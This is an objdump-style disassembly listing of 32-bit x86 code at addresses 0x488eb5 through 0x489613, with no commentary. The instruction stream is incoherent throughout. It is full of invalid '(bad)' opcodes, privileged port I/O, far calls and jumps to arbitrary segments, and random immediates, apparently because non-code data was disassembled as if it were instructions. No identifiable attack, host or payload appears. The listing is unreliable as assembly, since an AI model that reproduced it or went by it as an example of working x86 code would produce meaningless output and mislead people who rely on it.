  488eb5:	xchg   esi,eax
  488eb7:	add    BYTE PTR [edx],0x1b
  488eba:	xlat   BYTE PTR ds:[ebx]
  488ebb:	lahf   
  488ebc:	sub    DWORD PTR [edx+ebp*2],esi
  488ebf:	xor    dh,al
  488ec1:	cmp    dh,BYTE PTR [edi]
  488ec3:	mov    cl,0x2
  488ec5:	add    cl,BYTE PTR [ecx+0x5b18a72f]
  488ecb:	sbb    esi,DWORD PTR [ebp-0x1d00e0d9]
  488ed1:	nop
  488ed2:	mov    dh,0x5
  488ed4:	call   FWORD PTR [edi]
  488ed6:	out    0x9,eax
  488ed8:	and    bl,0xd2
  488edb:	dec    edi
  488edc:	ss mov bh,0x52
  488edf:	loop   0x488ea5
  488ee1:	xchg   edx,eax
  488ee2:	xor    bh,ah
  488ee4:	pop    eax
  488ee5:	push   0x5f5f42ac
  488eea:	inc    esi
  488eeb:	mov    ebp,0x45871283
  488ef0:	aaa    
  488ef1:	imul   eax
  488ef3:	aam    0x7b
  488ef5:	(bad)  
  488ef6:	sub    ecx,DWORD PTR [ebx]
  488ef8:	aas    
  488ef9:	lds    ebp,FWORD PTR [ecx+0x41f25ad1]
  488eff:	idiv   edi
  488f01:	xor    BYTE PTR [edi+edx*2],ch
  488f04:	mov    edi,ds
  488f06:	xor    al,0xf
  488f08:	pusha  
  488f09:	sbb    al,0x77
  488f0b:	arpl   WORD PTR [edi+0x4bac3734],dx
  488f11:	shl    BYTE PTR [esi+0x3f],cl
  488f14:	mov    ds:0x26b1f52e,eax
  488f19:	push   edi
  488f1a:	pop    ss
  488f1b:	sbb    eax,DWORD PTR [edi]
  488f1d:	js     0x488ec8
  488f1f:	nop
  488f20:	mov    bh,0x8f
  488f22:	xchg   esi,eax
  488f23:	inc    ebp
  488f24:	mov    eax,DWORD PTR ds:0x476f25b8
  488f2a:	mov    bh,0x4e
  488f2c:	pusha  
  488f2d:	add    eax,0x637797c7
  488f32:	pop    esp
  488f33:	pop    edx
  488f34:	mov    DWORD PTR [edi-0x53f24499],ecx
  488f3a:	outs   dx,BYTE PTR ds:[esi]
  488f3b:	(bad)  
  488f3c:	aaa    
  488f3d:	lds    eax,FWORD PTR [ebp+0x31]
  488f40:	sbb    eax,0x317f347f
  488f45:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  488f46:	inc    ebp
  488f47:	adc    dl,dh
  488f49:	push   esi
  488f4a:	out    dx,eax
  488f4b:	mov    ebx,0xa571d634
  488f50:	xlat   BYTE PTR ds:[ebx]
  488f51:	pop    ds
  488f52:	ins    DWORD PTR es:[edi],dx
  488f53:	aad    0xb8
  488f55:	mov    al,ds:0xb7af348f
  488f5a:	and    al,ah
  488f5c:	add    ah,BYTE PTR [eax-0x9]
  488f5f:	inc    ecx
  488f60:	ret    0x8c98
  488f63:	inc    esp
  488f64:	test   DWORD PTR [ebx+0x43],0x2fd2b908
  488f6b:	xor    al,0xe7
  488f6d:	adc    al,0xd
  488f70:	popa   
  488f71:	xchg   DWORD PTR [eax],ebx
  488f73:	aam    0xc0
  488f75:	and    eax,0x4a917703
  488f7a:	pop    ebp
  488f7b:	mov    edi,?
  488f7d:	inc    edx
  488f7e:	daa    
  488f7f:	inc    ebp
  488f80:	ret    0x86aa
  488f83:	mov    bh,0x5f
  488f85:	pop    eax
  488f86:	gs cmp al,0x62
  488f89:	mov    bl,0x5f
  488f8b:	dec    edi
  488f8c:	sbb    al,0x10
  488f8e:	movq   mm6,mm3
  488f91:	aas    
  488f92:	rcl    BYTE PTR [ecx-0x50],1
  488f95:	scas   al,BYTE PTR es:[edi]
  488f96:	aas    
  488f97:	mov    edi,0x5a34b42
  488f9c:	sub    edx,DWORD PTR [edi+0x23]
  488f9f:	ds xchg edx,eax
  488fa1:	and    DWORD PTR [edx+0x35],0xffffffaf
  488fa5:	inc    edi
  488fa6:	cmp    bh,ch
  488fa8:	lods   eax,DWORD PTR ds:[esi]
  488fa9:	in     eax,dx
  488faa:	les    edi,FWORD PTR [edi+0x57]
  488fad:	add    ebp,DWORD PTR [edi+0xb66a589]
  488fb3:	out    dx,eax
  488fb4:	xlat   BYTE PTR ds:[ebx]
  488fb5:	mov    eax,ds:0x174056f7
  488fba:	ja     0x488f7b
  488fbc:	dec    eax
  488fbd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  488fbe:	xor    DWORD PTR [edi-0x15],0xc5363643
  488fc5:	push   esp
  488fc6:	add    eax,DWORD PTR [ebx+0x39]
  488fc9:	inc    DWORD PTR [ebx+0xf]
  488fcc:	add    eax,0x43721694
  488fd1:	dec    edi
  488fd2:	xor    eax,0xdf8488b1
  488fd7:	dec    DWORD PTR [edx+0x1f612856]
  488fdd:	aaa    
  488fde:	or     BYTE PTR [eax],0xc5
  488fe1:	ror    BYTE PTR [edi+0x15],1
  488fe4:	arpl   WORD PTR ds:0x87a3ef76,ax
  488fea:	push   es
  488feb:	mov    es,WORD PTR [esi]
  488fed:	push   0xffffff8f
  488fef:	xor    DWORD PTR [eax-0x39],ebx
  488ff2:	xchg   edx,eax
  488ff3:	xchg   BYTE PTR [edi+0x45],al
  488ff6:	pop    ds
  488ff7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  488ff8:	inc    ecx
  488ff9:	sbb    al,0x6b
  488ffb:	aaa    
  488ffc:	aaa    
  488ffd:	and    al,0x30
  488fff:	call   0x3789cbfc
  489004:	or     edx,DWORD PTR [edx-0x1f]
  489007:	mov    ds:0x1f3f3797,al
  48900c:	adc    eax,0xe7136a84
  489011:	(bad)  
  489013:	sub    eax,0x36ffa6e0
  489018:	inc    edi
  489019:	mov    WORD PTR [eax+0x362f8663],es
  48901f:	aaa    
  489020:	adc    eax,0x8f462c1c
  489025:	ja     0x488fc6
  489027:	hlt    
  489028:	and    al,0x1c
  48902a:	pusha  
  48902b:	mov    ds:0xa6c18157,eax
  489030:	test   al,0xcf
  489032:	xor    ah,bh
  489034:	mov    ch,0x49
  489036:	xchg   ecx,eax
  489037:	inc    edx
  489038:	pop    DWORD PTR [esi+0x30]
  48903b:	pop    ss
  48903c:	ins    DWORD PTR es:[edi],dx
  48903d:	popf   
  48903e:	fiadd  DWORD PTR [eax+0x2bf17d7]
  489044:	pop    ebx
  489045:	or     BYTE PTR [edx],al
  489047:	or     ecx,DWORD PTR [edi+0x55a8a142]
  48904d:	das    
  48904e:	mov    eax,DWORD PTR ds:0xafb75897
  489054:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  489055:	movlps xmm1,QWORD PTR [ebx]
  489058:	ret    0x3b6
  48905b:	lahf   
  48905c:	xlat   BYTE PTR ds:[ebx]
  48905d:	lods   eax,DWORD PTR ds:[esi]
  48905e:	inc    edi
  48905f:	or     DWORD PTR [ebx+0x5c434f97],ebp
  489065:	add    dl,BYTE PTR [esi-0x51]
  489068:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  489069:	aaa    
  48906a:	mov    eax,ds:0x7f488435
  48906f:	iret   
  489070:	adc    BYTE PTR [ecx+ebx*1-0x45],0x6f
  489075:	mov    edi,0x2116b758
  48907a:	fwait
  48907b:	lahf   
  48907c:	mov    edx,0xf691690
  489081:	jg     0x4890b3
  489083:	inc    esp
  489084:	add    al,0x1e
  489086:	mov    ch,0xa
  489088:	ja     0x489099
  48908a:	inc    edx
  48908b:	bound  ecx,QWORD PTR [edx]
  48908d:	aad    0xf
  48908f:	push   edi
  489090:	aam    0xb1
  489092:	or     al,BYTE PTR [edi+0x57]
  489095:	das    
  489096:	inc    edi
  489097:	add    al,BYTE PTR [ecx]
  489099:	imul   edi,DWORD PTR [edi+eax*2+0xf6c9f4e],0x6b
  4890a1:	and    DWORD PTR [edi+0x7f],ecx
  4890a4:	dec    edi
  4890a5:	jns    0x4890d2
  4890a7:	sbb    BYTE PTR [ecx-0x21],dh
  4890aa:	pop    edi
  4890ab:	dec    esi
  4890ac:	xor    esi,DWORD PTR [ecx+0x38003a20]
  4890b2:	jg     0x48903c
  4890b4:	test   DWORD PTR [eax+0x25],ebx
  4890b7:	xchg   DWORD PTR [edi],esp
  4890b9:	sub    BYTE PTR [esi],ah
  4890bb:	add    bh,al
  4890bd:	xor    DWORD PTR [bx],ebp
  4890c0:	test   al,0x44
  4890c2:	in     al,dx
  4890c3:	inc    esi
  4890c4:	das    
  4890c5:	lahf   
  4890c6:	or     ch,BYTE PTR [ebx+0x4b42bb61]
  4890cc:	dec    edi
  4890cd:	pop    es
  4890ce:	inc    eax
  4890cf:	mov    dh,BYTE PTR [edi+ecx*1-0x4d]
  4890d3:	pop    ss
  4890d4:	and    DWORD PTR [edx+edx*1],esi
  4890d7:	js     0x4890f0
  4890d9:	xchg   edx,esp
  4890db:	cwde   
  4890dc:	mov    DWORD PTR [edi-0x49],ebp
  4890df:	(bad)  
  4890e0:	xor    DWORD PTR [esi+0x1fb96d28],esi
  4890e6:	xor    al,0x7f
  4890e8:	out    dx,eax
  4890e9:	inc    ebx
  4890ea:	les    esp,FWORD PTR [edx+0x7fe7d09d]
  4890f0:	inc    ecx
  4890f1:	and    DWORD PTR [ebx+0x5773274d],0x88c18527
  4890fb:	pop    ds
  4890fc:	arpl   WORD PTR [eax+eiz*2-0x79],ax
  489100:	outs   dx,BYTE PTR ds:[esi]
  489101:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  489102:	push   edi
  489103:	sub    BYTE PTR [ebx],0xd8
  489106:	rol    bh,cl
  489108:	push   edi
  489109:	aaa    
  48910a:	inc    esp
  48910b:	in     al,0x93
  48910d:	js     0x4890e9
  48910f:	outs   dx,DWORD PTR ds:[esi]
  489110:	mov    edi,0xab413686
  489115:	dec    ebx
  489116:	ret    0xd8b7
  489119:	xor    DWORD PTR [edx+0x1f972363],eax
  48911f:	or     ecx,DWORD PTR [eax+0x51]
  489122:	sbb    BYTE PTR [edi-0x8],ch
  489125:	add    al,0x6a
  489127:	adc    al,0x97
  489129:	pop    es
  48912a:	xor    bh,BYTE PTR [eax+0x63]
  48912d:	push   ebp
  48912e:	dec    ecx
  48912f:	lahf   
  489130:	sub    ecx,DWORD PTR ds:[ebp+0x430720e4]
  489137:	lahf   
  489138:	lods   eax,DWORD PTR ds:[esi]
  489139:	es and ecx,ecx
  48913c:	xor    al,0xdf
  48913e:	add    al,0x56
  489140:	dec    ecx
  489141:	rcl    BYTE PTR [ebx+0x72408557],0x8d
  489148:	xchg   DWORD PTR [eax],esi
  48914a:	pop    ebx
  48914b:	push   ebp
  48914c:	aam    0x8
  48914e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48914f:	lahf   
  489150:	ss xchg ebx,eax
  489152:	inc    eax
  489153:	sub    ch,BYTE PTR [edi+eiz*1-0x5cfdbdd5]
  48915a:	outs   dx,DWORD PTR ds:[esi]
  48915b:	scas   eax,DWORD PTR es:[edi]
  48915c:	mov    ebp,DWORD PTR [ebx+eiz*1+0x49f1b42]
  489163:	popa   
  489164:	jo     0x4891a7
  489166:	scas   eax,DWORD PTR es:[edi]
  489167:	arpl   WORD PTR [eax+ecx*8-0x28],dx
  48916b:	pop    edi
  48916c:	outs   dx,DWORD PTR ds:[esi]
  48916d:	imul   eax,DWORD PTR [edx+eax*4-0x1f48d4f1],0x4f558295
  489178:	pop    es
  489179:	sahf   
  48917a:	adc    ah,BYTE PTR [edi+0x52f74854]
  489180:	ret    0x841b
  489183:	push   es
  489184:	daa    
  489185:	into   
  489186:	daa    
  489187:	rol    BYTE PTR [esi],0x12
  48918a:	jmp    0x48914b
  48918c:	scas   eax,DWORD PTR es:[edi]
  48918d:	sub    cl,BYTE PTR [ecx]
  48918f:	lods   al,BYTE PTR ds:[esi]
  489190:	ret    0xef6f
  489193:	lods   eax,DWORD PTR ds:[esi]
  489194:	xchg   edx,eax
  489195:	shl    BYTE PTR [esi-0x71f95001],0xd0
  48919c:	gs (bad) 
  48919f:	inc    esp
  4891a0:	shr    BYTE PTR [edx-0x46a88fe0],0x43
  4891a7:	mov    ebx,DWORD PTR [ebx+0x5f]
  4891aa:	pop    ds
  4891ab:	inc    edx
  4891ac:	inc    edx
  4891ad:	mov    DWORD PTR [esi+0x24],0xc758a79b
  4891b4:	lds    edx,FWORD PTR [edi+ecx*2]
  4891b7:	xor    ah,BYTE PTR [edi+0x60]
  4891ba:	jnp    0x48915f
  4891bc:	sub    eax,0x1f576f07
  4891c1:	leave  
  4891c2:	mov    eax,ds:0xfe776056
  4891c7:	inc    ecx
  4891c8:	and    BYTE PTR [edi],0x63
  4891cb:	sub    eax,0x2b014fbf
  4891d0:	nop
  4891d1:	cmp    bl,cl
  4891d3:	out    0x2c,eax
  4891d5:	stos   BYTE PTR es:[edi],al
  4891d6:	or     ebp,DWORD PTR [esi+0x3f]
  4891d9:	cmp    BYTE PTR [edi],dh
  4891db:	mov    ch,bl
  4891dd:	mov    ah,0x56
  4891df:	(bad)  
  4891e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4891e1:	stos   DWORD PTR es:[edi],eax
  4891e2:	sbb    al,0x42
  4891e4:	xchg   DWORD PTR [edi-0x35],esp
  4891e7:	jg     0x489174
  4891e9:	fwait
  4891ea:	shr    BYTE PTR [eax+0x37],0xdf
  4891ee:	adc    al,0x58
  4891f0:	adc    DWORD PTR [eax+0x2f],ecx
  4891f3:	ja     0x48923b
  4891f5:	adc    BYTE PTR [ecx-0x7428e8e8],ch
  4891fb:	adc    eax,esp
  4891fd:	mov    ds:0x8cb16d7,al
  489202:	pop    ebp
  489203:	jg     0x48922c
  489205:	xor    al,0x70
  489207:	daa    
  489208:	lods   al,BYTE PTR ds:[esi]
  489209:	das    
  48920a:	dec    edi
  48920b:	cmp    DWORD PTR [ebx-0x101dbffe],ebp
  489211:	lahf   
  489212:	add    al,0x46
  489215:	ins    DWORD PTR es:[edi],dx
  489216:	xchg   DWORD PTR [edi-0x5ef90b56],esi
  48921c:	ffreep st(2)
  48921e:	dec    DWORD PTR [edi]
  489220:	mov    cl,0xe4
  489222:	adc    eax,esi
  489224:	push   esi
  489225:	xor    ch,al
  489227:	nop
  489228:	and    dl,BYTE PTR [eax]
  48922a:	pop    ds
  48922b:	jle    0x48920a
  48922d:	and    al,0xd6
  48922f:	or     eax,0x316e9f57
  489234:	cwde   
  489235:	or     BYTE PTR [edi-0x22f7f4f2],bl
  48923b:	add    ch,bh
  48923d:	adc    al,0xa3
  48923f:	test   DWORD PTR [ebp-0x61],esi
  489242:	mov    edi,0x62e20ab4
  489247:	aaa    
  489248:	inc    edi
  489249:	sbb    eax,0xd7d1a30f
  48924e:	sub    esi,esi
  489250:	lahf   
  489251:	push   ss
  489252:	xchg   ecx,eax
  489253:	mov    ch,0x1d
  489255:	xor    al,0x2b
  489257:	(bad)  
  489258:	sub    eax,0x7fd86bbc
  48925d:	outs   dx,DWORD PTR ds:[esi]
  48925e:	inc    esp
  48925f:	or     ebx,DWORD PTR [edx]
  489261:	gs sub al,0x3a
  489264:	push   edi
  489265:	mov    bh,0xd5
  489267:	mov    al,0x9
  489269:	les    ebx,FWORD PTR [edi]
  48926b:	fild   WORD PTR [ebx-0x85aa417]
  489271:	imul   eax,DWORD PTR [ecx+0x3f],0x46
  489275:	add    esi,ebx
  489277:	sbb    dl,BYTE PTR [edx-0x73f7e831]
  48927d:	add    bh,BYTE PTR [esi+esi*1]
  489280:	mov    bl,BYTE PTR [bp+si-0x3f]
  489284:	mov    ah,BYTE PTR [edi]
  489286:	jg     0x48928b
  489288:	inc    edx
  489289:	and    dh,BYTE PTR [edi+eax*4]
  48928c:	pop    ds
  48928d:	inc    ebp
  48928e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  48928f:	adc    DWORD PTR [edx-0x69],edx
  489292:	iret   
  489293:	pop    ebp
  489294:	les    eax,FWORD PTR [esi]
  489296:	(bad)  
  489297:	dec    edi
  489298:	out    dx,eax
  489299:	xchg   DWORD PTR [eax-0x6c41ddde],edx
  48929f:	inc    esp
  4892a0:	aas    
  4892a1:	dec    ebx
  4892a2:	aad    0xe0
  4892a4:	xchg   esp,eax
  4892a5:	das    
  4892a6:	aaa    
  4892a7:	fist   WORD PTR [esi+0x75]
  4892aa:	mov    ah,0x4c
  4892ac:	ss addr16 pop edi
  4892af:	inc    esp
  4892b0:	jb     0x4892b7
  4892b2:	xor    al,0xaf
  4892b4:	xor    DWORD PTR [esi-0x3f],eax
  4892b7:	jns    0x48923d
  4892b9:	iret   
  4892ba:	xor    DWORD PTR [edi+0x16],ebx
  4892bd:	sbb    dh,BYTE PTR [eax+0x34fb70a]
  4892c3:	(bad)  
  4892c4:	xchg   esi,esp
  4892c6:	shl    BYTE PTR [edi],cl
  4892c8:	inc    edx
  4892c9:	daa    
  4892ca:	sub    ch,BYTE PTR [ebp+0x473fc0a5]
  4892d0:	push   edx
  4892d1:	lahf   
  4892d2:	les    edx,FWORD PTR [ebp+0x67ff3696]
  4892d8:	(bad)  
  4892d9:	xchg   edi,eax
  4892da:	jbe    0x4892ef
  4892dc:	mov    bl,0xc3
  4892de:	add    BYTE PTR [edi+0xa],bl
  4892e1:	inc    ebp
  4892e2:	outs   dx,DWORD PTR ds:[esi]
  4892e3:	and    esi,DWORD PTR [bp+0x118a]
  4892e8:	xlat   BYTE PTR ds:[ebx]
  4892e9:	pop    ss
  4892ea:	mov    bh,0x90
  4892ec:	scas   al,BYTE PTR es:[edi]
  4892ed:	inc    edi
  4892ee:	inc    ebx
  4892ef:	inc    edi
  4892f0:	ja     0x48929e
  4892f2:	popa   
  4892f3:	adc    eax,0x775fda2c
  4892f8:	out    dx,eax
  4892f9:	es push edi
  4892fb:	cmp    ebx,DWORD PTR [edx]
  4892fd:	aas    
  4892fe:	inc    esp
  4892ff:	jbe    0x4892a0
  489301:	pusha  
  489302:	push   eax
  489303:	adc    DWORD PTR [ebx-0x18ec98cf],edx
  489309:	xor    DWORD PTR [ecx+0x56333587],ebx
  48930f:	lods   eax,DWORD PTR ds:[esi]
  489310:	fdiv   DWORD PTR [ecx-0x48d0f0aa]
  489316:	es ss inc eax
  489319:	outs   dx,DWORD PTR ds:[esi]
  48931a:	out    0x9f,al
  48931c:	in     eax,0x8
  48931e:	xor    al,0x6c
  489320:	movzx  ebx,WORD PTR [ebx+0x50]
  489324:	sub    ebx,DWORD PTR [eax-0x3f]
  489327:	out    0x7,al
  489329:	test   DWORD PTR [ecx-0x3f],0x9f4edf21
  489330:	xor    esi,DWORD PTR [edx]
  489332:	neg    DWORD PTR [eax]
  489334:	test   DWORD PTR [edx],ebp
  489336:	into   
  489337:	inc    ebx
  489338:	push   edi
  489339:	adc    dl,BYTE PTR [ebp-0x3a]
  48933c:	mov    dl,BYTE PTR [ebp+0x2f]
  48933f:	pop    edi
  489340:	shrd   DWORD PTR [esi+edx*8],eax,cl
  489344:	sbb    DWORD PTR [edi+0x4b],0xdb705068
  48934b:	push   edx
  48934c:	neg    DWORD PTR [esi-0x9]
  48934f:	mov    esi,0x970ee080
  489354:	xor    eax,0x310037f7
  489359:	popa   
  48935a:	push   esp
  48935b:	ins    DWORD PTR es:[edi],dx
  48935c:	inc    ebx
  48935d:	aas    
  48935e:	aaa    
  48935f:	cmp    al,0x42
  489361:	jb     0x4893b7
  489363:	aas    
  489364:	inc    ebx
  489365:	call   0xbbf7:0xd1b78b8
  48936c:	push   edi
  48936d:	sub    DWORD PTR [eax+0x34d78d0c],edx
  489373:	lods   eax,DWORD PTR ds:[esi]
  489374:	push   0x43eb1e21
  489379:	pop    ss
  48937a:	daa    
  48937b:	in     al,0x2a
  48937d:	test   eax,0x30d7bf43
  489382:	adc    dh,dl
  489384:	inc    eax
  489385:	test   DWORD PTR [edi-0x7e],ecx
  489388:	adc    BYTE PTR [ebp+0xf],dl
  48938b:	div    DWORD PTR [edi]
  48938d:	(bad)  
  48938e:	dec    eax
  48938f:	test   BYTE PTR [edx],al
  489391:	mov    al,0x5f
  489393:	adc    eax,0x57c0b819
  489398:	inc    esp
  489399:	(bad)  
  48939a:	and    DWORD PTR [ebx-0x7d],ecx
  48939d:	test   DWORD PTR [edi-0x6d520ad1],eax
  4893a3:	(bad)  
  4893a4:	scas   al,BYTE PTR es:[edi]
  4893a5:	mov    ebx,DWORD PTR [edi+0x44]
  4893a8:	les    ebp,FWORD PTR [edx+0x1fa7955a]
  4893ae:	add    bh,BYTE PTR [esi-0x6050e650]
  4893b4:	sbb    eax,0xfdc0620
  4893b9:	mul    DWORD PTR [eax-0x66]
  4893bc:	test   eax,0x3207d783
  4893c1:	es pop es
  4893c3:	shl    DWORD PTR [esi+0x438f3f37],0x1b
  4893ca:	add    al,0xd4
  4893cc:	adc    esp,DWORD PTR [ebx]
  4893ce:	push   edi
  4893cf:	dec    edi
  4893d0:	imul   ebx,DWORD PTR [ebx-0x3f],0x3f2f4200
  4893d7:	test   DWORD PTR [ebp-0x3860963c],ecx
  4893dd:	add    eax,0x5b585d80
  4893e2:	dec    edi
  4893e3:	sub    BYTE PTR [edx],ah
  4893e5:	leave  
  4893e6:	add    DWORD PTR [eax],edi
  4893e8:	cmp    BYTE PTR [eax],bh
  4893ea:	add    BYTE PTR [ebp+0x77],0x6f
  4893ee:	inc    ecx
  4893ef:	mov    dh,0xe
  4893f1:	xor    al,0xe8
  4893f3:	das    
  4893f4:	mov    eax,DWORD PTR [ebp-0x6022887c]
  4893fa:	inc    edx
  4893fb:	mov    edi,0x8c71332f
  489400:	add    eax,0x5aa679b
  489405:	adc    BYTE PTR [esi-0x21],al
  489408:	daa    
  489409:	or     DWORD PTR [eax+0x65],ebx
  48940c:	test   bh,cl
  48940e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  48940f:	inc    eax
  489410:	js     0x4893bd
  489412:	fild   QWORD PTR [edi+0x4f]
  489415:	clc    
  489416:	mov    ds:0x778f46b4,al
  48941b:	mov    edx,DWORD PTR [ebp+0x59]
  48941e:	cmp    BYTE PTR [edi+0x792de3c7],bl
  489424:	xlat   BYTE PTR ds:[ebx]
  489425:	test   eax,0x39a63927
  48942a:	mov    ch,0x89
  48942c:	aad    0xc4
  48942e:	retf   0xd7a7
  489431:	(bad)  
  489432:	les    esp,FWORD PTR [eax]
  489434:	adc    ch,bl
  489436:	add    DWORD PTR [ebx-0x68ede7b5],ebp
  48943c:	(bad)  
  48943d:	lds    ebp,FWORD PTR [esi-0x53]
  489440:	dec    edi
  489441:	lahf   
  489442:	mov    dh,0x5
  489444:	xor    ecx,DWORD PTR [eax+0x55479750]
  48944a:	add    ecx,esp
  48944c:	mov    eax,ds:0x2b07f82
  489451:	pusha  
  489452:	mov    cl,BYTE PTR [edi]
  489454:	inc    edx
  489455:	dec    edi
  489456:	mov    dh,0xde
  489458:	push   0xffffffb2
  48945a:	inc    edi
  48945b:	mov    ebx,0xd62e336
  489460:	das    
  489461:	add    ebp,DWORD PTR [edi]
  489463:	loope  0x4894cf
  489465:	dec    ebp
  489466:	mov    al,BYTE PTR cs:[ecx+0x5f]
  48946a:	inc    edx
  48946b:	sub    eax,0x3f8ea839
  489470:	xor    al,0xf
  489472:	xor    BYTE PTR ds:0xe7ac06d4,ch
  489478:	ja     0x489411
  48947a:	add    DWORD PTR [esi],0x72
  48947d:	push   ecx
  48947e:	out    0x41,eax
  489480:	iret   
  489481:	or     DWORD PTR [ebx+0x1fde5831],ecx
  489487:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  489488:	or     al,BYTE PTR [ecx+0x3c]
  48948b:	xrelease mov DWORD PTR [esi+0x33],0x77ff24d6
  489493:	xchg   ebx,eax
  489494:	sbb    BYTE PTR [ebp+0x15b58710],al
  48949a:	push   0x37c78711
  48949f:	sub    al,BYTE PTR [esi-0x587f0f]
  4894a5:	shl    BYTE PTR [edx+0x18],0x97
  4894a9:	adc    dh,bh
  4894ab:	adc    BYTE PTR [edx],ah
  4894ad:	or     cl,BYTE PTR [ebp+0x4702afaf]
  4894b3:	sub    al,0x8c
  4894b5:	stos   BYTE PTR es:[edi],al
  4894b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4894b7:	inc    esp
  4894b8:	push   ebp
  4894b9:	add    ecx,DWORD PTR [ebp+edx*2+0x50889f8f]
  4894c0:	add    eax,0xb41a788
  4894c5:	mov    ch,0x9a
  4894c7:	pop    edi
  4894c8:	or     DWORD PTR [ecx-0x787487a7],0xffffffff
  4894cf:	pop    ds
  4894d0:	mov    ecx,0xeb0e7051
  4894d5:	cmp    al,BYTE PTR [edi+0x47]
  4894d8:	jne    0x489486
  4894da:	mov    eax,0x5f397f2a
  4894df:	mov    edi,0x6f25c871
  4894e4:	jle    0x489516
  4894e6:	inc    esi
  4894e7:	inc    ecx
  4894e8:	shl    BYTE PTR [edx],0x16
  4894eb:	push   esi
  4894ec:	(bad)  
  4894ed:	aas    
  4894ee:	or     BYTE PTR [ebx+0x1a],ch
  4894f1:	test   BYTE PTR [edi-0x59],bh
  4894f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4894f5:	mov    eax,0x5f57ac2c
  4894fa:	(bad)  
  4894fb:	mov    ch,0x8
  4894fd:	or     al,0x97
  4894ff:	inc    edi
  489500:	mov    cl,0xda
  489502:	call   0x85d8:0xb7a73ff1
  489509:	push   ss
  48950a:	cmp    bl,BYTE PTR [edi+0x7c875287]
  489510:	ror    BYTE PTR [eax+0x2e],0x46
  489514:	daa    
  489515:	xor    cl,al
  489517:	add    eax,0x69d79022
  48951c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  48951d:	pop    ebx
  48951e:	scas   eax,DWORD PTR es:[edi]
  48951f:	pop    edx
  489520:	neg    DWORD PTR [eax-0x6d]
  489523:	mov    cl,0xa
  489525:	daa    
  489526:	aas    
  489527:	mov    BYTE PTR [edx+esi*2+0x55],al
  48952b:	daa    
  48952c:	xor    al,0xb1
  48952e:	ret    
  48952f:	shr    BYTE PTR [edx-0x4727c0d9],0x60
  489536:	nop
  489537:	out    0x42,eax
  489539:	scas   al,BYTE PTR es:[edi]
  48953a:	push   ecx
  48953b:	push   edi
  48953c:	stos   DWORD PTR es:[edi],eax
  48953d:	packssdw mm6,mm7
  489540:	inc    esi
  489541:	adc    al,0x2c
  489543:	ret    0x379a
  489546:	jg     0x48957f
  489548:	test   DWORD PTR [edx-0x26],edi
  48954b:	lods   al,BYTE PTR ds:[esi]
  48954c:	mov    bl,0xf7
  48954e:	outs   dx,DWORD PTR ds:[esi]
  48954f:	lds    edi,FWORD PTR [edx+0x377f2dac]
  489555:	rol    BYTE PTR ds:0x5b4c,0x97
  48955b:	xor    DWORD PTR [edi+0x35],ebp
  48955e:	xchg   esp,eax
  48955f:	inc    eax
  489560:	stos   DWORD PTR es:[edi],eax
  489561:	push   edi
  489562:	xchg   ebx,eax
  489563:	iret   
  489564:	inc    esi
  489565:	jmp    0x8a47:0x4517692a
  48956c:	fisub  DWORD PTR [esi+0x7739bfc4]
  489572:	ror    BYTE PTR [edx+0x48],1
  489575:	stos   DWORD PTR es:[edi],eax
  489576:	addr16 inc edi
  489578:	add    esi,DWORD PTR [edi+0x27d7ba4b]
  48957e:	xchg   edx,eax
  48957f:	add    BYTE PTR [edx+esi*2-0x77],ch
  489583:	outs   dx,DWORD PTR ds:[esi]
  489584:	daa    
  489585:	mov    edi,0xd086c3d9
  48958a:	inc    edi
  48958b:	outs   dx,DWORD PTR ds:[esi]
  48958c:	xlat   BYTE PTR ds:[ebx]
  48958d:	setge  BYTE PTR [esi+ebp*8]
  489591:	push   ebx
  489592:	and    esp,esi
  489594:	aas    
  489595:	stos   DWORD PTR es:[edi],eax
  489596:	test   BYTE PTR [ecx-0xc61944],al
  48959c:	clc    
  48959d:	scas   al,BYTE PTR es:[edi]
  48959e:	outs   dx,BYTE PTR ds:[esi]
  48959f:	add    BYTE PTR [edi+0x45],al
  4895a2:	iret   
  4895a3:	xor    eax,0x10543212
  4895a8:	inc    edi
  4895a9:	inc    ebx
  4895aa:	mov    al,BYTE PTR [edi+edx*2+0x377e3fba]
  4895b1:	daa    
  4895b2:	jbe    0x489617
  4895b4:	push   edi
  4895b5:	xlat   BYTE PTR ds:[ebx]
  4895b6:	aas    
  4895b7:	xor    eax,DWORD PTR [eax-0x78]
  4895ba:	xchg   ebx,eax
  4895bb:	rcl    BYTE PTR [edi-0x76],0xa3
  4895bf:	push   eax
  4895c0:	xchg   DWORD PTR [edi],ebx
  4895c2:	xlat   BYTE PTR ds:[ebx]
  4895c3:	inc    edx
  4895c4:	(bad)  
  4895c5:	fcomp  DWORD PTR [eax+0x35]
  4895c8:	xor    BYTE PTR [edi-0x6b],bl
  4895cb:	adc    BYTE PTR [edx+0x272fa756],bl
  4895d1:	xor    DWORD PTR [ecx-0x6],edx
  4895d4:	rcr    BYTE PTR [edi-0x7d],0x9a
  4895d8:	ficom  DWORD PTR [ecx+0x30af0789]
  4895de:	enter  0x76c1,0x43
  4895e2:	out    dx,eax
  4895e3:	aaa    
  4895e4:	inc    esp
  4895e5:	xlat   BYTE PTR ds:[ebx]
  4895e6:	mov    eax,0x86e76b0f
  4895eb:	xlat   BYTE PTR ds:[ebx]
  4895ec:	add    BYTE PTR [esi],ah
  4895ee:	push   cs
  4895ef:	sbb    DWORD PTR [edi+0x53ac6935],edx
  4895f5:	imul   ebp,DWORD PTR [edi+0x17],0x2ae04cd8
  4895fc:	(bad)  
  4895fd:	cmp    DWORD PTR [edi],edi
  4895ff:	and    al,0x22
  489601:	push   ebp
  489602:	mov    DWORD PTR [edi+0x5623c382],esi
  489608:	mov    DWORD PTR [ebx+0x77],0x3818b6ac
  48960f:	mov    bh,0xcb
  489611:	ja     0x489615
  489613:	(bad)  
